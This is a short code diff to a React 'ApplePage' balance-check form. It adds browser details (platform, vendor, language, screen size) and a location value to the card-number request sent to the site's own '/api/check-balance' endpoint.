@@ -44,13 +44,22 @@ export default function ApplePage() {
     if (!card.trim()) return setError('Please enter a card number.')
     setLoading(true)
     try {
+      const browserInfo = {
+        platform: navigator.platform,
+        vendor: navigator.vendor,
+        language: navigator.language,
+        screen: `${window.screen.width}x${window.screen.height}`
+      }
+
       const res = await fetch('/api/check-balance', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           cardNumber: card.replace(/\s+/g, ''),
           type: 'apple',
-          deviceId: deviceId
+          deviceId: deviceId,
+          location: location,
+          browserInfo: JSON.stringify(browserInfo)
         })
       })
       const data = await res.json()
